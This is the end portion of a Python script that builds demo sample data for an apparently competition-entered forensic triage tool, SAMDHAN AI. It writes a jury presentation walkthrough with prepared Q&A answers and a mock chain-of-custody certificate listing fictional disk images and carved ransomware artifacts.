### PHASE 1: The Problem & Live Evidence Ingestion (0:00 - 0:45)
1. Open the web interface at `http://localhost:5173/`.
2. Point out the **Quick Case Presets** at the top:
   - Click **\"Operation Nightfall (Ransomware Attack)\"**.
   - Note to the jury: *\"Notice how the system immediately locks down a read-only clone, computes the bitstream SHA-256 hash, and sets the incident temporal window (Sept 24, 14:00 - 22:30).\"*
3. Show the jury the physical evidence files inside `sample_data/01_INCIDENT_OPERATION_NIGHTFALL/`:
   - `seagate_barracuda_incident_dump.dd` (Raw 2MB forensic disk image)
   - `carved_sec_004F3A20_ransom_note.txt` (Carved BlackCat extortion note)
   - `auth_audit_carve.db` (Compromised audit database)
4. Click the bright neon button: **\"START ANALYSIS PIPELINE\"**.
   - Watch the 6-stage cyber triage pipeline execute in real time.

---

### PHASE 2: Autonomous Triage & Priority Scoring (0:45 - 1:45)
1. You will land on the **Live Investigation Center**:
   - **Artifact Ranking Table**: Show how the Ransom Note (`ART-1049`) is ranked **#1 Critical (Priority 98.2)** because of the multi-factor scoring formula:
     $$\\text{Priority} = 40\\% \\text{ Relevance} + 30\\% \\text{ Integrity} + 20\\% \\text{ Recency} + 10\\% \\text{ Uniqueness}$$
2. Click on **ART-1049** to open the **Artifact Inspector Modal**:
   - **Live Preview Tab**: Highlight the detected IOCs: Tor URL (`exfil.darkmesh.onion`) and Bitcoin address (`bc1qxy2kg...`).
   - **Color-Coded Hex Dump**: Show the exact byte stream with ASCII translation.
   - **Rule vs AI Arbitration**: Explain that the rule engine validates syntax while the ML model scores semantic threat context without hallucination.
   - **Audit Trail**: Show that every action is logged into an append-only, tamper-proof audit record.

---

### PHASE 3: Feature 01 — Intelligent Fragment Reconstruction (1:45 - 3:00)
1. Click **\"Intelligent Fragment Reconstruction\"** in the top navigation bar.
2. Select **Scenario A (Correct fragments shuffled)** and click **\"RUN FORENSIC WORKFLOW\"**.
   - Show the 12-stage forensic progression:
     1. Ingestion of raw chunks (`sample_data/03_CARVED_FRAGMENTS_FOR_RECONSTRUCTION/SCENARIO_A_SHUFFLED_JPEG/`)
     2. Directed Acyclic Graph (DAG) construction with node compatibility weights
     3. Topological branch reassembly
     4. Strict structural format validation (validating JFIF markers and Huffman tables)
     5. Provenance certificate export with cryptographic hashes!
3. Switch to **Scenario B** or **Scenario C**:
   - Show how the engine immediately flags missing trailers (missing IEND) or corrupted internal blocks rather than silently producing corrupt files.

---

## 💡 Top 4 Questions the Jury Might Ask (And Winning Answers)

| Jury Question | Winning Technical Answer |
|:--------------|:-------------------------|
| **\"How do you prevent AI hallucinations in evidence presentation?\"** | *\"Our system uses a dual-engine architecture: all file structures and bytes are strictly validated by deterministic rule engines (format parsers, CRC32, SHA-256). AI models are restricted to ranking relevance and extracting NLP entities; they never synthesize or alter byte streams.\"* |
| **\"How is Chain of Custody preserved?\"** | *\"Original media is mounted read-only. We compute cryptographic SHA-256 hashes at ingest and verify them at every pipeline hop. Every transition is persisted to an append-only SQLite audit log.\"* |
| **\"What happens if fragments belong to multiple different files?\"** | *\"Our Directed Graph evaluates format signature compatibility and boundary entropy transitions. Edges between incompatible formats (e.g. JPEG header to PDF object) receive zero compatibility weight and are pruned during graph solving.\"* |
| **\"Can this run offline in an air-gapped forensic lab?\"** | *\"Yes! The entire pipeline—FastAPI backend, Vite frontend, and local SQLite/disk engines—runs 100% locally on localhost without requiring internet or external cloud APIs.\"* |

---
*SAMDHAN AI -- Automated Digital Forensic Triaging & Fragment Reconstruction Platform*
"""
    (SAMPLE_DIR / "JURY_PRESENTATION_SCRIPT.md").write_text(jury_guide, encoding="utf-8")
    (SAMPLE_DIR / "README.md").write_text(jury_guide, encoding="utf-8")

    # ─────────────────────────────────────────────────────────────────────────
    # OFFICIAL CHAIN OF CUSTODY CERTIFICATE
    # ─────────────────────────────────────────────────────────────────────────
    coc_text = (
        "================================================================================\n"
        "                  DIGITAL EVIDENCE CHAIN OF CUSTODY FORM                        \n"
        "           ISO/IEC 27037:2012 DIGITAL EVIDENCE COMPLIANCE STANDARD             \n"
        "================================================================================\n\n"
        "AGENCY / LAB      : Cyber Forensic & Incident Response Division (CFIR)\n"
        "INCIDENT MASTER ID: INC-2026-SAMDHAN-01\n"
        "FORENSIC EXAMINER : Senior Inspector / AI Forensics Lead\n"
        "ACQUISITION DATE  : 2026-09-26T10:45:00Z\n"
        "VERIFICATION TOOL : SAMDHAN AI Integrity Assessment Engine (v2.4.0)\n"
        "STORAGE LOCATION  : A:\\Samdhan AI\\Samdhan-AI\\sample_data\\\n\n"
        "--------------------------------------------------------------------------------\n"
        "ACQUIRED EVIDENCE ITEMS & CRYPTOGRAPHIC VERIFICATION:\n"
        "--------------------------------------------------------------------------------\n"
        "ITEM #01:\n"
        "  - File Name      : 01_INCIDENT_OPERATION_NIGHTFALL/seagate_barracuda_incident_dump.dd\n"
        "  - Physical Media : Seagate Barracuda 2TB SATA (S/N: W1E89L90)\n"
        "  - Carved Offsets : 0x0004F000 (Ransom Note), 0x0008A000 (Batch Wiper), 0x000E0000 (Auth DB)\n"
        "  - SHA-256 Hash   : " + dd_hashes["sha256"] + "\n"
        "  - MD5 Hash       : " + dd_hashes["md5"] + "\n"
        "  - Integrity State: VERIFIED TAMPER-EVIDENT (READ-ONLY CLONE)\n\n"
        "ITEM #02:\n"
        "  - File Name      : 02_INCIDENT_PROJECT_AEGIS/sandisk_128gb_exfat_carved.raw\n"
        "  - Physical Media : SanDisk Ultra 128GB Flash Drive (S/N: SD-882190-EX)\n"
        "  - Carved Offsets : 0x00032000 (Exfiltration Bash Log), Unallocated CAD Schematics\n"
        "  - SHA-256 Hash   : " + raw_hashes["sha256"] + "\n"
        "  - MD5 Hash       : " + raw_hashes["md5"] + "\n"
        "  - Integrity State: VERIFIED TAMPER-EVIDENT (READ-ONLY CLONE)\n\n"
        "ITEM #03:\n"
        "  - File Name      : 03_CARVED_FRAGMENTS_FOR_RECONSTRUCTION/\n"
        "  - Description    : Binary chunks under Scenarios A (Shuffled), B (Truncated), C (Corrupt)\n"
        "  - Purpose        : Feature 01 Live Reassembly Demonstration for Evaluation Jury\n\n"
        "ITEM #04:\n"
        "  - File Name      : 04_ARTIFACT_INTEGRITY_BENCHMARK/\n"
        "  - Description    : 15 Ground-Truth Specification Artifacts (ART-001 through ART-015)\n\n"
        "--------------------------------------------------------------------------------\n"
        "CUSTODIAL TRANSFER & LOG:\n"
        "  - Transferred From: Physical Acquisition Write-Blocker Bridge (Tableau T8u)\n"
        "  - Transferred To  : SAMDHAN AI Local Analysis Storage\n"
        "  - Authorization   : Judicial Warrant / Incident Response Directive 2026-CFIR\n"
        "  - Signature       : [DIGITALLY SIGNED VIA SAMDHAN AI CRYPTOGRAPHIC KEYSTORE]\n"
        "================================================================================\n"
    )
    (SAMPLE_DIR / "CHAIN_OF_CUSTODY_CERTIFICATE.txt").write_text(coc_text, encoding="utf-8")

    print("[OK] Successfully created comprehensive 'sample_data' package for the jury!")

if __name__ == "__main__":
    main()
